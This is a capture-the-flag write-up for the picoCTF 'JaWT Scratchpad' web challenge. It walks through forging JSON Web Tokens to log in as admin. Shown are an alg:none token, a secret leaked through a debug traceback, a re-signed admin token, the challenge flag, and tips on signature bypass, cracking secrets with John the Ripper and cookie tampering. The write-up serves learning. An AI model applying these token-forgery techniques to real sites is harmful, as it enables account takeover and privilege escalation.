# JaWT Scratchpad

### Description:

Check the admin scratchpad!
Additional details will be available after launching your challenge instance.
Click "Launch Instance".
http://fickle-tempest.picoctf.net:58534
Hint: What is that cookie? / Have you heard of JWT?

### Commands / Steps:

```bash
# Step 1: We go to that website and see that we can use a random name to login. 

# Step 2: First, let's login with a random name and check the cookie like the hint suggested. In the developer tools of our browser, when we go to the Application tab -> Storage -> Cookies, we can see the jwt token of our session. 

# Step 3: Let's go to the website called "jwt.io" and decode that token. For example, I got this when decoded. 
# Header
{
  "typ": "JWT",
  "alg": "HS256"
}
# Payload
{
  "user": "john"
}

# Step 4: Maybe, we can encode the same way and get the cookie for admin? Let's try with the alg:None and payload user changed to admin(no secret key for now, since we don't know it yet).
{
  "typ": "JWT",
  "alg": "none"
}
{
  "user": "admin"
}
# json web token
# eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# Step 5: We take that token and then replace the old token with it in our cookies tab. Then, it gives us the traceback because we caused the debugger to catch an exception when we changed the token value. 
# In the trackback, we can see all the files there and among those files, we see the file named, server.py which shows the secret key used in jwt. 
# File "/app/server.py", line 30, in index
# def index():
#         flag = ""
 
#         if 'jwt' in request.cookies:
#                 cookie = request.cookies.get('jwt')
#                 user = jwt.decode(cookie, 'ilovepico')["user"]
 
#                 if ( user =="admin" ):
#                         flag = info["flag"]
#         else:
#                 user = None

# Step 6: So, we got the secret key from there, now we can use that key to encode the token for admin in "jwt.io".
# Header: Algorithm & Token Type
{
  "typ": "JWT",
  "alg": "HS256"
}
# Payload: Data
{
  "user": "admin"
}
# Sign JWT: Secret
ilovepico

# Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s

# Step 7: We replace the previous token with the new one and refresh our browser. Then, we'll get the flag.
```

### Flag:

> picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}

### Notes / Tips

- **JWT structure**: Header.Payload.Signature (base64 encoded JSON objects separated by dots)
- **Algorithm confusion**: Try changing `"alg": "HS256"` to `"alg": "none"` to bypass signature verification
- **Debug exploitation**: Malformed tokens often trigger debug traces that reveal source code and secrets
- **Secret key brute-force**: Use John the Ripper with `john --wordlist=rockyou.txt jwt.hash` for weak secret keys
- **Tools**: jwt.io for encoding/decoding, Browser DevTools → Application → Cookies for viewing/editing tokens
- **Cookie manipulation**: Replace JWT cookies in browser storage to change user privileges 


